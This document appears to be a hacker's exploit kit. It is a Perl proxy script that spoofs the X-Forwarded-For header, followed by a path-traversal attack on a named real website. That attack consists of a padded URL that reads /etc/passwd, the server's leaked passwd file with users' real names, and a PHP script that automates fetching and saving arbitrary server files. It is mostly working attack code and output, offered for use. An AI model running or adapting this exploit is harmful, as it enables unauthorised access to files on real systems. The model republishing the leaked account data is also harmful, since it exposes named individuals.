#!/usr/bin/perl
use strict;
use warnings;
use HTTP::Proxy;
use HTTP::Proxy::HeaderFilter::simple;
use Data::Dumper;

my $proxy = HTTP::Proxy->new;
$proxy->x_forwarded_for(0);
$proxy->port(3129);
$proxy->push_filter(
	mime    => undef,
	request => HTTP::Proxy::HeaderFilter::simple->new(
		sub { $_[1]->header('X-Forwarded-For' => '10.1.2.3') },
    ),
);
$proxy->start;

__DATA__

Go Hack Tetris!

o_O

O_o

^_O

www.gosu.pl/tetris/


http://www.2600.com/cuba/index.khtml?post=.///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////../../../../../etc/passwd

root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/sbin/nologin
operator:*:2:5:System &:/:/sbin/nologin
bin:*:3:7:Binaries Commands and Source,,,:/:/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/sbin/nologin
games:*:7:13:Games pseudo-user:/usr/games:/sbin/nologin
news:*:8:8:News Subsystem:/:/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/sbin/nologin
ftp:*:21:21:Anonymous FTP:/u/ftp:/sbin/nologin
sshd:*:22:65533:sshd unprivileged processes:/:/sbin/nologin
postfix:*:25:25:Postfix Mail System:/nonexistent:/nonexistent
bind:*:53:53:Bind Sandbox:/:/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/libexec/uucp/uucico
xten:*:67:67:X-10 daemon:/usr/local/xten:/sbin/nologin
pop:*:68:6:Post Office Owner:/nonexistent:/sbin/nologin
apache:*:80:80:Apache:/nonexistent:/sbin/nologin
apache2:*:8080:80:Apache:/nonexistent:/sbin/nologin
webstats:*:81:83:Web Statistics:/nonexistent:/sbin/nologin
thttpd:*:82:82:thttpd web server:/nonexistent:/sbin/nologin
htproxy:*:85:85:http proxy server:/nonexistent:/sbin/nologin
audit:*:87:87:system audit processes:/nonexistent:/sbin/nologin
mysql:*:88:88:MySQL Daemon:/var/db/mysql:/sbin/nologin
namazu:*:89:89:Namazu Database:/var/db/namazu:/sbin/nologin
apache2:*:90:90:World Wide Web Owner:/nonexistent:/sbin/nologin
ash:*:1000:1000:ash:/home/ash:/bin/tcsh
emmanuel:*:1001:20:emmanuel:/home/emmanuel:/bin/tcsh
mec:*:1002:1002:mec:/home/mec:/sbin/nologin
omar:*:1003:1003:omar:/home/omar:/sbin/nologin
marko:*:1004:1004:marko:/home/marko:/sbin/nologin
kerry:*:1005:1005:kerry:/home/kerry:/bin/tcsh
juintz:*:1006:1006:juintz:/home/juintz:/bin/tcsh
css:*:1007:1007:carl shapiro:/home/css:/bin/tcsh
kpx:*:1008:1008:kpx:/home/kpx:/sbin/nologin
lgonze:*:1009:1009:lgonze:/home/lgonze:/sbin/nologin
mlc:*:1010:1010:mlc:/home/mlc:/bin/tcsh
ashcroft:*:1011:1011:ashcroft:/home/ashcroft:/usr/local/bin/noshell
ortbot:*:2001:2001:www.ortinstitute.org automated processes:/nonexistent:/sbin/nologin
lexnex:*:2002:2002:lexnex:/home/lexnex:/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/sbin/nologin
sephail:*:1012:1012:Joseph Battaglia:/home/sephail:/sbin/nologin
redhackt:*:1013:1013:Red Hackt:/home/redhackt:/bin/tcsh
thedave:*:1014:1014:Dave Buchwald:/home/thedave:/bin/tcsh
phiber:*:1015:1015:Phiber:/home/phiber:/bin/tcsh
mark:*:1016:1016:Mark:/home/mark:/usr/local/bin/bash

<?php

// current path: $webroot = "/u/www/www.2600.com";

$file = '../../../etc/passwd';
// file can also be a directory name (must end with a slash) - gives directory structure, file_get_contents bug??
// its a little obfuscated with some random chars, but readable

// ------

$save = 'sources/';

$url = 'http://www.2600.com/cuba/index.khtml?post=';
$post = './/../../'.$file;

$overflow = 993;

while (strlen($post) < $overflow) {
    $post = str_replace('.//', './//', $post);
}

$url = $url . $post;

$cont = curl_cont($url);

preg_match('#<div id=\'blog\'>\s*<strong>[^<>]+</strong>\s*<br>([\s\S]+)</div>\s*<div class=\'clears\'>\s*</div>#Ui', $cont, $match);
$cont = $match[1];
$cont = preg_replace('#(\r\n|\n|\r)<br>(\r\n|\n|\r)(\r\n|\n|\r)<br>(\r\n|\n|\r)#', "\r\n\r\n", $cont);
$cont = preg_replace('#<br>(\r\n|\n|\r)#', "\r\n", $cont);
$cont = trim($cont);

if (!$cont) {
    echo 'failed';
    exit;
}

highlight_string($cont);

if (!function_exists('fput')) {
    function fput($f, $s)
    {
        $fp = fopen($f, 'w');
        fwrite($fp, $s);
        fclose($fp);
    }
}

$file = str_replace('http://www.2600.com/cuba/index.khtml?post=', '', $url);
$file = str_replace('../', '', $file);
$file = str_replace('./', '', $file);
$file = preg_replace('#/{2,}#', '', $file);
$file = str_replace('/', '-', $file);

if (!$file) {
    $file = '__index';
}
if ($file) {
    $file = $save.$file;
    if (!file_exists($file)) {
        @fput($file, $cont);
    }
}

function curl_cont($url, $options = array())
{
    $page = curl_get($url, $options);
    if (200 == $page['http_code']) {
        return $page['cont'];
    }
    return null;
}
function curl_get($url, $options = array())
{
    $url = str_replace(' ', '%20', $url);
    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_HEADER, isset($options['include_header']) ? $options['include_header'] : 0);
    if (substr($url, 0, strlen('https')) == 'https') {
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    }
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    if (isset($options['userpwd'])) {
        curl_setopt($ch, CURLOPT_USERPWD, $options['userpwd']);
    }
    if (isset($options['timeout'])) {
        $timeout = ceil($options['timeout']);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    }
    if (isset($options['max_size'])) {
        $range = "0-{$options['max_size']}";
        curl_setopt($ch, CURLOPT_RANGE, $range);
    }
    if (isset($options['referer'])) {
        curl_setopt($ch, CURLOPT_REFERER, $options['referer']);
    }
    // example agent: 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)'
    if (isset($options['agent'])) {
        curl_setopt($ch, CURLOPT_USERAGENT, $options['agent']);
    }
    if (isset($options['headers'])) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $options['headers']);
    }
    if (isset($options['cookie']) && count($options['cookie'])) {
        $cookie = '';
        foreach ($options['cookie'] as $name => $value) {
            $cookie .= sprintf('%s=%s; ', $name, urlencode($value));
        }
        $cookie = trim($cookie);
        curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    }

    $cont = curl_exec($ch);
    $error = curl_error($ch);
    if ($error) {
        trigger_error('curl_exec() failed: '.$error, E_USER_ERROR);
    }
    $inf = curl_getinfo($ch);
    $inf['cont'] = $cont;
    curl_close($ch);

    return $inf;
}

?> 